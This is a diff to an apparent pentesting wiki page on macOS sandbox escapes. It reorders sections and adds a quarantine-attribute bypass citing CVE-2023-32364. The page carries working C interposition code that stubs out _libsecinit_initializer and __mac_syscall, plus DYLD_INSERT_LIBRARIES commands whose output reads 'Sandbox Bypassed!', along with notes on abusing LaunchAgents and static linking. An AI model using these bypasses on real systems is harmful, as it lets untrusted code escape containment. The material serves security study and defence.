@@ -25,13 +25,147 @@ Finally, the sandbox will be activated will a call to **`__sandbox_ms`** which w
 
 ## Possible Bypasses
 
-{% hint style="warning" %}
-Note that **files created by sandboxed processes** are appended the **quarentine attribute** to prevent sandbox escaped.
-{% endhint %}
+### Bypassing quarantine attribute
 
-### Run binary without Sandbox
+**Files created by sandboxed processes** are appended the **quarantine attribute** to prevent sandbox escaped. However, if you manage to **create an `.app` bundle without the quarantine attribute** within a sandboxed application, you could make the app bundle binary point to **`/bin/bash`** and add some env variables in the **plist** to abuse launchctl to **launch the new app unsandboxed**.
 
-If you run a binary that won't be sandboxed from a sandboxed binary, it will **run within the sandbox of the parent process**.
+This is what was done in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
+
+### Abusing Open functionality
+
+In the [**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) can be appreciated how the **`open`** cli functionality could be abused to bypass the sandbox.
+
+### Abusing Auto Start Locations
+
+If a sandboxed process can **write** in a place where **later an unsandboxed application is going to run the binary**, it will be able to **escape just by placing** there the binary. A good example of this kind of locations are `~/Library/LaunchAgents` or `/System/Library/LaunchDaemons`.
+
+For this you might even need **2 steps**: To make a process with a **more permissive sandbox** (`file-read*`, `file-write*`) execute your code which will actually write in a place where it will be **executed unsandboxed**.
+
+Check this page about **Auto Start locations**:
+
+{% content-ref url="../../../../macos-auto-start-locations.md" %}
+[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
+{% endcontent-ref %}
+
+### Abusing other processes
+
+If from then sandbox process you are able to **compromise other processes** running in less restrictive sandboxes (or none), you will be able to escape to their sandboxes:
+
+{% content-ref url="../../../macos-proces-abuse/" %}
+[macos-proces-abuse](../../../macos-proces-abuse/)
+{% endcontent-ref %}
+
+### Static Compiling & Dynamically linking
+
+[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
+
+* If the binary was **completely statically compiled**, it could avoid loading that library.
+* If the **binary wouldn't need to load any libraries** (because the linker is also in libSystem), it won't need to load libSystem.&#x20;
+
+### Shellcodes
+
+Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
+
+```bash
+ld -o shell shell.o -macosx_version_min 13.0
+ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
+```
+
+### Entitlements
+
+Note that even if some **actions** might be **allowed by at he sandbox** if an application has an specific **entitlement**, like in:
+
+```scheme
+(when (entitlement "com.apple.security.network.client")
+      (allow network-outbound (remote ip))
+      (allow mach-lookup
+             (global-name "com.apple.airportd")
+             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
+             (global-name "com.apple.cfnetwork.cfnetworkagent")
+             [...]
+```
+
+### Interposting Bypass
+
+For more information about **Interposting** check:
+
+{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% endcontent-ref %}
+
+#### Interpost `_libsecinit_initializer` to prevent the sandbox
+
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+
+void _libsecinit_initializer(void);
+
+void overriden__libsecinit_initializer(void) {
+    printf("_libsecinit_initializer called\n");
+}
+
+__attribute__((used, section("__DATA,__interpose"))) static struct {
+	void (*overriden__libsecinit_initializer)(void);
+	void (*_libsecinit_initializer)(void);
+}
+_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
+```
+
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+_libsecinit_initializer called
+Sandbox Bypassed!
+```
+
+#### Interpost `__mac_syscall` to prevent the Sandbox
+
+{% code title="interpose.c" %}
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+#include <string.h>
+
+// Forward Declaration
+int __mac_syscall(const char *_policyname, int _call, void *_arg);
+
+// Replacement function
+int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
+    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+        printf("Bypassing Sandbox initiation.\n");
+        return 0; // pretend we did the job without actually calling __mac_syscall
+    }
+    // Call the original function for other cases
+    return __mac_syscall(_policyname, _call, _arg);
+}
+
+// Interpose Definition
+struct interpose_sym {
+    const void *replacement;
+    const void *original;
+};
+
+// Interpose __mac_syscall with my_mac_syscall
+__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
+    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
+};
+```
+{% endcode %}
+
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 0
+Bypassing Sandbox initiation.
+__mac_syscall invoked. Policy: Quarantine, Call: 87
+__mac_syscall invoked. Policy: Sandbox, Call: 4
+Sandbox Bypassed!
+```
 
 ### Debug & bypass Sandbox with lldb
 
@@ -177,138 +311,6 @@ Process 2517 exited with status = 0 (0x00000000)
 {% hint style="warning" %}
 **Even with the Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop
 {% endhint %}
-
-### Abusing other processes
-
-If from then sandbox process you are able to **compromise other processes** running in less restrictive sandboxes (or none), you will be able to escape to their sandboxes:
-
-{% content-ref url="../../../macos-proces-abuse/" %}
-[macos-proces-abuse](../../../macos-proces-abuse/)
-{% endcontent-ref %}
-
-### Interposting Bypass
-
-For more information about **Interposting** check:
-
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
-{% endcontent-ref %}
-
-#### Interpost `_libsecinit_initializer` to prevent the sandbox
-
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-
-void _libsecinit_initializer(void);
-
-void overriden__libsecinit_initializer(void) {
-    printf("_libsecinit_initializer called\n");
-}
-
-__attribute__((used, section("__DATA,__interpose"))) static struct {
-	void (*overriden__libsecinit_initializer)(void);
-	void (*_libsecinit_initializer)(void);
-}
-_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
-```
-
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-_libsecinit_initializer called
-Sandbox Bypassed!
-```
-
-#### Interpost `__mac_syscall` to prevent the Sandbox
-
-{% code title="interpose.c" %}
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-#include <string.h>
-
-// Forward Declaration
-int __mac_syscall(const char *_policyname, int _call, void *_arg);
-
-// Replacement function
-int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-        printf("Bypassing Sandbox initiation.\n");
-        return 0; // pretend we did the job without actually calling __mac_syscall
-    }
-    // Call the original function for other cases
-    return __mac_syscall(_policyname, _call, _arg);
-}
-
-// Interpose Definition
-struct interpose_sym {
-    const void *replacement;
-    const void *original;
-};
-
-// Interpose __mac_syscall with my_mac_syscall
-__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
-};
-```
-{% endcode %}
-
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 0
-Bypassing Sandbox initiation.
-__mac_syscall invoked. Policy: Quarantine, Call: 87
-__mac_syscall invoked. Policy: Sandbox, Call: 4
-Sandbox Bypassed!
-```
-
-### Static Compiling & Dynamically linking
-
-[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
-
-* If the binary was **completely statically compiled**, it could avoid loading that library.
-* If the **binary wouldn't need to load any libraries** (because the linker is also in libSystem), it won't need to load libSystem.&#x20;
-
-### Shellcodes
-
-Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
-
-```bash
-ld -o shell shell.o -macosx_version_min 13.0
-ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
-```
-
-### Entitlements
-
-Note that even if some **actions** might be **allowed by at he sandbox** if an application has an specific **entitlement**, like in:
-
-```scheme
-(when (entitlement "com.apple.security.network.client")
-      (allow network-outbound (remote ip))
-      (allow mach-lookup
-             (global-name "com.apple.airportd")
-             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
-             (global-name "com.apple.cfnetwork.cfnetworkagent")
-             [...]
-```
-
-### Abusing Auto Start Locations
-
-If a sandboxed process can **write** in a place where **later an unsandboxed application is going to run the binary**, it will be able to **escape just by placing** there the binary. A good example of this kind of locations are `~/Library/LaunchAgents` or `/System/Library/LaunchDaemons`.
-
-For this you might even need **2 steps**: To make a process with a **more permissive sandbox** (`file-read*`, `file-write*`) execute your code which will actually write in a place where it will be **executed unsandboxed**.
-
-Check this page about **Auto Start locations**:
-
-{% content-ref url="../../../../macos-auto-start-locations.md" %}
-[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
-{% endcontent-ref %}
 
 ## References
 
